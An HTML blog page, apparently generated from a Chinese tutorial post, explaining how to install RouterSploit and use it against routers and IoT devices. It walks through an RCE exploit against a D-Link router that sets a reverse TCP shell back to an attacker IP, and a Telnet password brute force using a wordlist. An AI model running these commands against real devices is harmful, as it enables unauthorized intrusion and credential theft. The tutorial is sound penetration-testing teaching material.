@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="dark" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://mirrors.sustech.edu.cn/cdnjs/ajax/libs/Primer/21.0.7/primer.css' rel='stylesheet' />
+    
+    <link rel="icon" href="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true"><script>
+        let theme = localStorage.getItem("meek_theme") || "light";
+        document.documentElement.setAttribute("data-color-mode", theme);
+    </script>
+<meta name="description" content="routersploit基于python3开发，安装过程相当简单
+
+方法一：从github克隆（推荐）
+```bash
+#1.克隆仓库（以社区活跃分支为例）
+
+git clone https://github.com/wuxinios/routercploit.git
+
+#2.进入目录
+cd routersploit
+
+#3.安装依赖
+pip3 install -r requirements.txt
+ 
+#4.运行
+python3 rsf.py
+
+```
+
+方法二：使用docker安装
+```bash
+#拉取镜像
+docker pull threat9/routersploit
+
+#或者从克隆的目录构建
+docker build -t routersploit .
+
+#运行容器
+docker run -it --rm routersploit
+
+```
+
+运行成功后，你会看到一个交互式命令行提示符：rsf>
+
+
+好的，下面为你详细介绍一下 **RouterSploit**，这个专门用于嵌入式设备和网络设备安全的强大开源框架。">
+<meta property="og:title" content="routersploit安装与运行-补充1">
+<meta property="og:description" content="routersploit基于python3开发，安装过程相当简单
+
+方法一：从github克隆（推荐）
+```bash
+#1.克隆仓库（以社区活跃分支为例）
+
+git clone https://github.com/wuxinios/routercploit.git
+
+#2.进入目录
+cd routersploit
+
+#3.安装依赖
+pip3 install -r requirements.txt
+ 
+#4.运行
+python3 rsf.py
+
+```
+
+方法二：使用docker安装
+```bash
+#拉取镜像
+docker pull threat9/routersploit
+
+#或者从克隆的目录构建
+docker build -t routersploit .
+
+#运行容器
+docker run -it --rm routersploit
+
+```
+
+运行成功后，你会看到一个交互式命令行提示符：rsf>
+
+
+好的，下面为你详细介绍一下 **RouterSploit**，这个专门用于嵌入式设备和网络设备安全的强大开源框架。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://binghey.github.io/blog/post/routersploit-an-zhuang-yu-yun-xing---bu-chong-1.html">
+<meta property="og:image" content="https://github.com/binghey/blog/blob/main/%E6%89%A7%E8%A1%8C%E5%90%88%E4%B8%80%E7%AC%94%E8%AE%B0.png?raw=true">
+<title>routersploit安装与运行-补充1</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">routersploit安装与运行-补充1</h1>
+<div class="title-right">
+    <a href="https://binghey.github.io/blog" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/binghey/blog/issues/16" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><p>routersploit基于python3开发，安装过程相当简单</p>
+<p>方法一：从github克隆（推荐）</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>1.克隆仓库（以社区活跃分支为例）</span>
+
+git clone https://github.com/wuxinios/routercploit.git
+
+<span class="pl-c"><span class="pl-c">#</span>2.进入目录</span>
+<span class="pl-c1">cd</span> routersploit
+
+<span class="pl-c"><span class="pl-c">#</span>3.安装依赖</span>
+pip3 install -r requirements.txt
+ 
+<span class="pl-c"><span class="pl-c">#</span>4.运行</span>
+python3 rsf.py
+</pre></div>
+<p>方法二：使用docker安装</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>拉取镜像</span>
+docker pull threat9/routersploit
+
+<span class="pl-c"><span class="pl-c">#</span>或者从克隆的目录构建</span>
+docker build -t routersploit <span class="pl-c1">.</span>
+
+<span class="pl-c"><span class="pl-c">#</span>运行容器</span>
+docker run -it --rm routersploit
+</pre></div>
+<p>运行成功后，你会看到一个交互式命令行提示符：rsf&gt;</p>
+<p>好的，下面为你详细介绍一下 <strong>RouterSploit</strong>，这个专门用于嵌入式设备和网络设备安全的强大开源框架。</p>
+<h3>RouterSploit 全面详解</h3>
+<h4>一、什么是 RouterSploit？</h4>
+<p><strong>RouterSploit</strong> 是一个开源的漏洞利用框架，专门针对<strong>嵌入式设备</strong>和<strong>网络设备</strong>，如：</p>
+<ul>
+<li><strong>路由器</strong></li>
+<li><strong>摄像头</strong>（IP Camera）</li>
+<li><strong>网络附加存储</strong>（NAS）</li>
+<li><strong>打印机</strong></li>
+<li><strong>智能家居设备</strong>（如智能插座、网关）</li>
+<li>以及其他运行着定制化固件的 IoT 设备</li>
+</ul>
+<p>它在设计上<strong>高度借鉴了 Metasploit 的理念和架构</strong>，因此如果你熟悉 Metasploit，会非常容易上手 RouterSploit。你可以把它看作是 <strong>“嵌入式设备领域的 Metasploit”</strong>。</p>
+<p><strong>项目地址</strong>： <code class="notranslate">https://github.com/threat9/routersploit</code> （请注意，原仓库已归档，社区有多个活跃分支，例如 <code class="notranslate">https://github.com/wuxinios/routersploit</code>）</p>
+<hr>
+<h4>二、核心架构与功能模块</h4>
+<p>RouterSploit 采用模块化设计，其模块主要分为以下几大类，可以通过 <code class="notranslate">use</code> 命令加载，类似于 Metasploit。</p>
+<ol>
+<li>
+<p><strong>侦察模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 用于识别目标设备的品牌、型号、固件版本等信息，而无需进行攻击。</li>
+<li><strong>例子</strong>： <code class="notranslate">scanners/autopwn</code>， <code class="notranslate">scanners/cameras/tplink_cloud_cam_scanner</code></li>
+</ul>
+</li>
+<li>
+<p><strong>漏洞利用模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 这是框架的核心。这些模块包含针对特定设备、特定固件版本的已知漏洞的利用代码。</li>
+<li><strong>目标</strong>： 利用漏洞在目标设备上执行代码、获取敏感信息或造成拒绝服务。</li>
+<li><strong>例子</strong>： <code class="notranslate">exploits/routers/dlink/dir_8xx_300_315_645_815_upnp_rce</code> （D-Link 多个型号的远程代码执行漏洞）</li>
+</ul>
+</li>
+<li>
+<p><strong>凭据扫描模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 针对设备的管理界面（如 Web 界面、Telnet、SSH）进行默认或弱口令的暴力破解。</li>
+<li><strong>为什么重要</strong>： 很多 IoT 设备在出厂后从未更改过默认密码，这是最常见的安全问题之一。</li>
+<li><strong>例子</strong>： <code class="notranslate">creds/telnet_bruteforce</code>， <code class="notranslate">creds/http_basic_auth_bruteforce</code></li>
+</ul>
+</li>
+<li>
+<p><strong>载荷模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 在漏洞利用成功后，用于在目标设备上执行特定操作的单行命令或小型脚本。</li>
+<li><strong>例子</strong>： <code class="notranslate">payloads/generic/bind_tcp</code> （在目标上打开一个 TCP 端口进行绑定连接）， <code class="notranslate">payloads/generic/reverse_tcp</code> （让目标设备反向连接到攻击者的机器）。</li>
+</ul>
+</li>
+<li>
+<p><strong>泛洪攻击模块</strong></p>
+<ul>
+<li><strong>功能</strong>： 对目标设备发起拒绝服务攻击，用于测试设备的抗压能力。</li>
+<li><strong>注意</strong>： <strong>请务必在授权环境下使用</strong>，否则是非法的。</li>
+<li><strong>例子</strong>： <code class="notranslate">flooders/tcp</code>， <code class="notranslate">flooders/http</code></li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4>三、安装与运行</h4>
+<p>RouterSploit 基于 <strong>Python 3</strong> 开发，安装过程相对简单。</p>
+<p><strong>方法一：从 GitHub 克隆（推荐）</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 克隆仓库（以社区活跃分支为例）</span>
+git clone https://github.com/wuxinios/routersploit.git
+
+<span class="pl-c"><span class="pl-c">#</span> 2. 进入目录</span>
+<span class="pl-c1">cd</span> routersploit
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 安装依赖</span>
+pip3 install -r requirements.txt
+
+<span class="pl-c"><span class="pl-c">#</span> 4. 运行</span>
+python3 rsf.py</pre></div>
+<p><strong>方法二：使用 Docker</strong><br>
+如果你不想配置 Python 环境，Docker 是最简单的方式。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 拉取镜像（可能需要寻找维护中的 Docker 镜像）</span>
+docker pull threat9/routersploit
+<span class="pl-c"><span class="pl-c">#</span> 或者从克隆的目录构建</span>
+docker build -t routersploit <span class="pl-c1">.</span>
+
+<span class="pl-c"><span class="pl-c">#</span> 运行容器</span>
+docker run -it --rm routersploit</pre></div>
+<p>运行成功后，你会看到一个交互式命令行提示符：<code class="notranslate">rsf &gt;</code></p>
+<hr>
+<h4>四、基本使用流程与实战示例</h4>
+<p>让我们模拟一次对目标路由器（假设为 D-Link DIR-815 路由器）的测试流程。</p>
+<p><strong>步骤 1：启动并搜索模块</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">python3 rsf.py
+<span class="pl-c"><span class="pl-c">#</span> 在 rsf 提示符下，搜索与 D-Link 相关的模块</span>
+rsf <span class="pl-k">&gt;</span> search dlink</pre></div>
+<p>这会列出所有与 <code class="notranslate">dlink</code> 相关的 exploits, scanners 和 creds 模块。</p>
+<p><strong>步骤 2：使用侦察模块（可选）</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rsf <span class="pl-k">&gt;</span> use scanners/autopwn
+rsf (Autopwn) <span class="pl-k">&gt;</span> show options</pre></div>
+<p>设置目标后运行，它会自动尝试识别目标设备可能存在的漏洞。</p>
+<p><strong>步骤 3：使用漏洞利用模块</strong><br>
+假设我们找到了一个针对 DIR-815 的漏洞。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 选择利用模块</span>
+rsf <span class="pl-k">&gt;</span> use exploits/routers/dlink/dir_8xx_300_315_645_815_upnp_rce
+
+<span class="pl-c"><span class="pl-c">#</span> 2. 查看需要设置的选项</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> show options
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 设置目标</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+[+] target =<span class="pl-k">&gt;</span> 192.168.1.1
+
+<span class="pl-c"><span class="pl-c">#</span> 4. 设置载荷（例如，一个反向 TCP Shell）</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> payload generic/reverse_tcp
+[+] payload =<span class="pl-k">&gt;</span> generic/reverse_tcp
+
+<span class="pl-c"><span class="pl-c">#</span> 5. 查看载荷选项并设置</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> show options
+
+<span class="pl-c"><span class="pl-c">#</span> 设置攻击者的 IP 和端口</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lhost 192.168.1.100 <span class="pl-c"><span class="pl-c">#</span> 你的 Kali IP</span>
+[+] lhost =<span class="pl-k">&gt;</span> 192.168.1.100
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> lport 4444
+[+] lport =<span class="pl-k">&gt;</span> 4444
+
+<span class="pl-c"><span class="pl-c">#</span> 6. 执行攻击</span>
+rsf (D-Link DIR-8XX Remote Code Execution) <span class="pl-k">&gt;</span> run</pre></div>
+<p>如果漏洞利用成功，你将在本地的 4444 端口收到一个来自目标路由器的反向 Shell。</p>
+<p><strong>步骤 4：使用凭据扫描模块</strong><br>
+如果漏洞利用不成功，可以尝试爆破。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 1. 选择 Telnet 暴力破解模块</span>
+rsf <span class="pl-k">&gt;</span> use creds/telnet_bruteforce
+
+<span class="pl-c"><span class="pl-c">#</span> 2. 设置目标、用户名和密码字典文件</span>
+rsf (Telnet Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> target 192.168.1.1
+rsf (Telnet Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> username admin
+rsf (Telnet Bruteforce) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> passwd /usr/share/wordlists/rockyou.txt
+
+<span class="pl-c"><span class="pl-c">#</span> 3. 运行</span>
+rsf (Telnet Bruteforce) <span class="pl-k">&gt;</span> run</pre></div>
+<p>如果成功，工具会显示出有效的用户名和密码。</p>
+<hr>
+<h4>五、RouterSploit 的优势与局限</h4>
+<p><strong>优势：</strong></p>
+<ol>
+<li><strong>高度专业化</strong>： 专注于一个被传统漏洞扫描器忽视的领域。</li>
+<li><strong>模块化与可扩展</strong>： 结构清晰，易于添加新的漏洞利用模块。</li>
+<li><strong>开源免费</strong>： 完全免费，社区驱动。</li>
+<li><strong>与 Metasploit 相似</strong>： 学习曲线平缓，尤其对于 Metasploit 用户。</li>
+<li><strong>功能全面</strong>： 覆盖了从信息收集到漏洞利用、凭据爆破的完整攻击链。</li>
+</ol>
+<p><strong>局限与挑战：</strong></p>
+<ol>
+<li><strong>依赖社区更新</strong>： 由于原项目已归档，漏洞库的更新依赖于社区的活跃分支，可能无法涵盖最新的漏洞。</li>
+<li><strong>架构兼容性</strong>： 很多漏洞利用和载荷是针对特定 CPU 架构（如 MIPS, ARM）的，需要精确匹配。</li>
+<li><strong>环境依赖性</strong>： 在某些网络环境下，反向连接等载荷可能因为 NAT、防火墙等原因失败。</li>
+<li><strong>误报可能性</strong>： 自动化工具并非 100% 准确，需要手动验证。</li>
+</ol>
+<hr></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://binghey.github.io/blog">知行合一笔记</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","binghey/blog");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
